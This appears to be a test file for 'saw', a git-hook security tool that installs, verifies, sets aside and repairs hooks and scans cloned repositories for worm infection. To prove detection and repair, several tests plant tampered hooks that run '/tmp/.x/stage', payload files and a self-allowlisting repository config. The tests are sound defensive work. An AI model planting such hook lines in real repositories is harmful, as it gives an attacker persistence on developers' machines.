        stale.write_text(hook.hookscript.render("post-merge", str(self.home / "evil" / "saw"), None))
        code, text = self._quiet(hook.uninstall)
        self.assertEqual(code, 0, text)
        (kept,) = _set_aside(self.home)
        self.assertIn(str(self.home / "evil" / "saw"), (kept / "kept" / "post-merge").read_text())

    def test_a_record_that_is_a_link_or_relative_is_refused(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        record = hook.hookscript.declaration_path()
        record.write_text(json.dumps({"saw": "saw", "config": None}))
        self.assertIsNone(hook.hookscript.installed())
        record.unlink()
        elsewhere = self.home / "elsewhere.json"
        elsewhere.write_text("keep\n")
        os.symlink(elsewhere, record)
        self.assertFalse(hook.hookscript.declare("/usr/local/bin/saw", None))
        self.assertEqual(elsewhere.read_text(), "keep\n")
        self.assertIsNone(hook.hookscript.installed())

    def test_status_and_repair_agree_on_where_saws_hooks_run(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        moved = self.home / "dotfiles" / "git-template"
        __import__("shutil").copytree(self._managed().parent, moved)
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(moved)], context=hook.gitutil.OPERATOR_CONFIG)
        altered = moved / "hooks" / "post-merge"
        altered.write_text(altered.read_text().replace("exit 0\n", "/tmp/.x/stage\nexit 0\n"))
        self.assertEqual(hook.hookscript.altered_hooks(), [altered])
        self.assertIn("saw hook repair", self._quiet(hook.status)[1])
        code, text, done = _reporting(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertIn((hook.REPAIRED, altered), _states(done))
        self.assertEqual(hook.hookscript.altered_hooks(), [])
        self.assertNotIn("saw hook repair", self._quiet(hook.status)[1])

    def test_a_seeded_repository_whose_saw_hooks_are_all_gone_is_reported(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        repo = _repo({"a.txt": "x\n"})
        self.addCleanup(lambda: __import__("shutil").rmtree(repo, ignore_errors=True))
        self._seed(repo)
        for event in hook._HOOKS:
            (repo / ".git" / "hooks" / event).unlink()
        self.assertEqual(sorted(hook.hookscript.altered_hooks()), sorted(repo / ".git" / "hooks" / e for e in hook._HOOKS))
        self.assertIn("saw hook repair", self._quiet(hook.status)[1])

    def test_what_saw_keeps_for_itself_is_never_a_hooks_directory(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        for kept in (hook.hookscript.set_aside_dir(), hook.hookscript.set_aside_dir() / "x"):
            kept.mkdir(parents=True, exist_ok=True)
            self.assertEqual(hook._repair_repository(kept, hook._saw_executable(), None)[0].state, hook.UNVERIFIED)
            self.assertEqual(hook._settle(kept, hook._saw_executable(), None, own=False)[0].state, hook.UNVERIFIED)
            self.assertEqual(list(kept.iterdir()), [])

    def test_a_dotfiles_layout_keeps_its_record(self):
        real = self.home / "dotfiles" / "saw"
        real.mkdir(parents=True)
        (self.home / ".config").mkdir()
        os.symlink(real, self.home / ".config" / "saw")
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertIsNotNone(hook.hookscript.installed())
        self.assertEqual(self._quiet(hook.repair)[0], 0)

    def test_another_spelling_of_saws_own_directory_is_still_saws_own(self):
        managed = self._managed()
        managed.mkdir(parents=True)
        spelled = managed.parent.parent / "Git-Template"
        if not spelled.exists():
            self.skipTest("this filesystem tells the two names apart")
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(spelled)], context=hook.gitutil.OPERATOR_CONFIG)
        planted = managed / "post-checkout"
        planted.write_text("#!/bin/sh\n/tmp/.x/stage\n")
        os.chmod(planted, 0o755)
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertFalse((managed / "post-checkout.local").exists())
        self.assertEqual(hook._installed_hooks_dirs()[1:], [])
        self.assertEqual(len(_set_aside(self.home)), 1)

    def test_a_relative_template_path_is_refused_before_anything_is_written(self):
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", "my-template"], context=hook.gitutil.OPERATOR_CONFIG)
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            code, text = self._quiet(hook.install)
        self.assertEqual(code, 2)
        self.assertIn("relative", err.getvalue())
        self.assertFalse((Path.cwd() / "my-template").exists())


class TestSetAside(_Isolated):
    def test_a_dangling_link_is_moved_and_counted_as_moved(self):
        link = self.home / "hooks" / "post-checkout"
        link.parent.mkdir()
        os.symlink(self.home / "nowhere", link)
        folder = hook.hookscript.set_aside(link)
        self.assertIsNotNone(folder)
        self.assertFalse(os.path.lexists(link))
        self.assertTrue((folder / "kept" / "post-checkout").is_symlink())

    def test_a_planted_record_name_cannot_replace_the_record(self):
        planted = self.home / "hooks" / "origin.json"
        planted.parent.mkdir()
        planted.write_text('{"planted": true}\n')
        folder = hook.hookscript.set_aside(planted)
        self.assertEqual((folder / "kept" / "origin.json").read_text(), '{"planted": true}\n')
        self.assertEqual(json.loads((folder / "origin.json").read_text())["path"], str(planted))

    def test_what_is_moved_aside_is_kept_whole_with_its_origin(self):
        victim = self.home / "hooks" / "pre-push"
        victim.parent.mkdir()
        victim.write_bytes(b"#!/bin/sh\n\x00payload\n")
        os.chmod(victim, 0o755)
        folder = hook.hookscript.set_aside(victim)
        self.assertIsNotNone(folder)
        self.assertFalse(victim.exists())
        self.assertEqual((folder / "kept" / "pre-push").read_bytes(), b"#!/bin/sh\n\x00payload\n")
        record = json.loads((folder / "origin.json").read_text())
        self.assertEqual(record["path"], str(victim))
        self.assertEqual(record["size"], 19)
        self.assertEqual(record["mode"], oct(0o100755))
        self.assertIsNone(record["symlink_target"])

    def test_a_symlink_is_moved_as_a_link_and_a_directory_whole(self):
        target = self.home / "elsewhere.sh"
        target.write_text("echo target\n")
        link = self.home / "hooks" / "lib.sh"
        link.parent.mkdir()
        os.symlink(target, link)
        folder = hook.hookscript.set_aside(link)
        self.assertTrue((folder / "kept" / "lib.sh").is_symlink())
        self.assertTrue(target.exists())
        self.assertEqual(json.loads((folder / "origin.json").read_text())["symlink_target"], str(target))
        nested = self.home / "hooks" / "lib"
        (nested / "deep").mkdir(parents=True)
        (nested / "deep" / "x.sh").write_text("x\n")
        folder = hook.hookscript.set_aside(nested)
        self.assertFalse(nested.exists())
        self.assertEqual((folder / "kept" / "lib" / "deep" / "x.sh").read_text(), "x\n")

    def test_a_store_that_cannot_hold_the_file_leaves_it_where_it_is(self):
        victim = self.home / "hooks" / "pre-push"
        victim.parent.mkdir()
        victim.write_text("x\n")
        root = hook.hookscript.set_aside_dir()
        root.parent.mkdir(parents=True)
        os.symlink(self.home / "hooks", root)
        self.assertIsNone(hook.hookscript.set_aside(victim))
        self.assertEqual(victim.read_text(), "x\n")

    def test_two_files_of_one_name_moved_in_one_second_are_both_kept(self):
        a = self.home / "a" / "post-merge"
        b = self.home / "b" / "post-merge"
        for p, body in ((a, "a\n"), (b, "b\n")):
            p.parent.mkdir()
            p.write_text(body)
        fa = hook.hookscript.set_aside(a)
        fb = hook.hookscript.set_aside(b)
        self.assertNotEqual(fa, fb)
        self.assertEqual({(fa / "kept" / "post-merge").read_text(), (fb / "kept" / "post-merge").read_text()}, {"a\n", "b\n"})


class TestHookScript(unittest.TestCase):
    def test_generated_hook_is_valid_posix_sh_with_awkward_paths(self):
        # A saw/config path with a space + `$` must not break or shell-expand — shlex.quote guards it.
        s = hook._hook_script("post-checkout", "/opt/my saw$dir/saw", "/home/op/c f.yml")
        r = subprocess.run(["sh", "-n"], input=s, text=True, capture_output=True)  # parse-only
        self.assertEqual(r.returncode, 0, f"generated hook is not valid sh:\n{s}\n{r.stderr}")
        self.assertIn(hook._MARKER, s)
        self.assertIn("post-checkout.local", s)                      # chains to a preserved hook
        self.assertTrue(s.rstrip().endswith("exit 0"))               # never fails the git command

    def test_hook_script_has_no_config_flag_when_none(self):
        s = hook._hook_script("post-merge", "/usr/local/bin/saw", None)
        self.assertNotIn("--config", s)

    def test_generated_hook_does_not_bake_no_stream(self):
        s = hook._hook_script("post-checkout", "/usr/local/bin/saw", None)
        self.assertNotIn("--no-stream", s)

    def test_remediation_commands_use_a_distinct_colour(self):
        from stayawake.utils.render import LINK, SEVERITY
        with mock.patch.object(hook_report, "supports_color", return_value=True):
            cmd = hook._cmd("saw scan /x", sys.stdout)          # a remediation command
            label = hook._paint("Inspect:", "dim", sys.stdout)  # surrounding prose
        self.assertIn(LINK, cmd)                                # command in the LINK colour…
        self.assertNotIn(LINK, label)                           # …distinct from the dim prose
        self.assertIn(SEVERITY["info"], label)


class TestTrustModel(_Isolated):
    def test_cloned_repos_own_allowlist_is_ignored(self):
        # THE trust invariant: a worm ships a config/security.yml whose allowlist would whitelist its
        # own payload. The hook must scan with the OPERATOR's policy (here: none) and STILL flag it.
        repo = _repo({
            ".gitignore": _INFECTED,
            "config/security.yml": "allowlist:\n  - signature: gitignore-autopush-markers\n",
        })
        self._in_repo(repo)
        head = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        # config_path=None → operator has no allowlist → the finding is NOT suppressed.
        self.assertEqual(hook.run_event("post-checkout", [hook._NULL_REV, head, "1"]), 1)


class TestTheOutboundHookIsInstalledWithTheOthers(_Isolated):
    """saw installs `pre-push` beside the inbound hooks; its template passes the refs on intact."""

    def test_the_installed_hook_reads_the_refs_it_is_given(self):
        script = hook.hookscript.render("pre-push", "/usr/bin/saw", None)
        self.assertIn('_feed | /usr/bin/saw hook run pre-push "$@" || true', script)
        self.assertTrue(hook.hookscript.is_pristine(script))

    def test_pre_push_is_installed_alongside_the_inbound_hooks(self):
        hook.install()
        self.assertIn("pre-push", hook._HOOKS)
        self.assertTrue(hook.hookscript.is_ours(hook._hooks_dir() / "pre-push"))
        self.assertIn("</dev/null", (hook._hooks_dir() / "post-merge").read_text())

    def test_the_template_needs_no_temporary_file(self):
        self.assertNotIn("mktemp", hook.hookscript.render("pre-push", "/usr/bin/saw", None))

    def test_the_template_is_valid_shell(self):
        for config in (None, "/etc/saw config.yml"):
            script = hook.hookscript.render("pre-push", "/usr/bin/saw", config)
            subprocess.run(["sh", "-n"], input=script.encode(), check=True)
            self.assertTrue(hook.hookscript.is_pristine(script))

    def _run_prepush_script(self, local_body, stdin=b"refs/heads/main a refs/heads/main b\n"):
        d = Path(tempfile.mkdtemp(prefix="hook-pp-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(d, ignore_errors=True))
        (d / "pre-push").write_text(hook.hookscript.render("pre-push", "true", None))
        os.chmod(d / "pre-push", 0o755)
        if local_body is not None:
            (d / "pre-push.local").write_text(local_body)
            os.chmod(d / "pre-push.local", 0o755)
        return subprocess.run(["sh", str(d / "pre-push"), "origin", "url"], input=stdin).returncode

    def test_the_chained_local_hook_receives_the_pushed_refs(self):
        got = Path(tempfile.mkdtemp(prefix="hook-got-")) / "refs"
        self.addCleanup(lambda: __import__("shutil").rmtree(got.parent, ignore_errors=True))
        refs = b"refs/heads/main 1111 refs/heads/main 2222\n"
        self._run_prepush_script(f'#!/bin/sh\ncat > "{got}"\n', stdin=refs)
        self.assertEqual(got.read_bytes(), refs)

    def test_a_blocking_chained_hook_can_still_reject_the_push(self):
        self.assertEqual(self._run_prepush_script("#!/bin/sh\nexit 1\n"), 1)
        self.assertEqual(self._run_prepush_script("#!/bin/sh\nexit 0\n"), 0)
        self.assertEqual(self._run_prepush_script(None), 0)

    def test_a_stripped_inbound_hook_reads_as_altered(self):
        d = Path(tempfile.mkdtemp(prefix="hook-in-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(d, ignore_errors=True))
        p = d / "post-merge"
        p.write_text(hook.hookscript.render("post-merge", "/usr/bin/saw", None).replace(" </dev/null", ""))
        os.chmod(p, 0o755)
        self.assertEqual(hook.hookscript.verdict(p), hook.hookscript.ALTERED)

    def test_an_operator_pre_push_with_its_own_chain_costs_only_the_push_check(self):
        tmpl = self.home / "operator-template"
        (tmpl / "hooks").mkdir(parents=True)
        for name in ("pre-push", "pre-push.local"):
            (tmpl / "hooks" / name).write_text("#!/bin/sh\nexit 0\n")
            os.chmod(tmpl / "hooks" / name, 0o755)
        subprocess.run(["git", "config", "--global", "init.templateDir", str(tmpl)], check=True)
        self.assertEqual(hook.install(), 0)
        for event in ("post-checkout", "post-merge", "post-rewrite"):
            self.assertTrue(hook.hookscript.is_ours(tmpl / "hooks" / event))
        self.assertEqual((tmpl / "hooks" / "pre-push").read_text(), "#!/bin/sh\nexit 0\n")

    def test_the_kill_switch_silences_the_push_check(self):
        with mock.patch.dict(os.environ, {"SAW_HOOK_DISABLED": "1"}), \
                mock.patch.object(hook.outbound, "check_push", side_effect=AssertionError("ran")):
            self.assertEqual(hook.run_event("pre-push", ["origin", "url"]), 0)


if __name__ == "__main__":
    unittest.main()
